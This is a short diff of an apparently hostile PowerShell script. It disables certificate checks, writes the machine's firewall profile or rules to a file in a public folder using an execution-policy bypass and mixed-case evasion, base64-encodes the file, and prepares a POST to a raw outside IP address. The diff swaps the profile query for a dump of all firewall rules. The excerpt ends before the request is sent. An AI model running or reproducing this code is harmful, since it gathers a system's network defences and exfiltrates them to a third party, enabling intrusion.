@@ -1,6 +1,6 @@
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 New-Item c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "netsh advfirewall show currentprofile" > c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "netsh advfirewall firewall show rule name=all" > c:\users\public\music\file.txt;
 $EncodedText = [convert]::ToBase64String((Get-Content -path c:\users\public\music\file.txt -Encoding byte));
 $verb = "POST";
 $addr = "https://46.161.53.115/micr0answer";
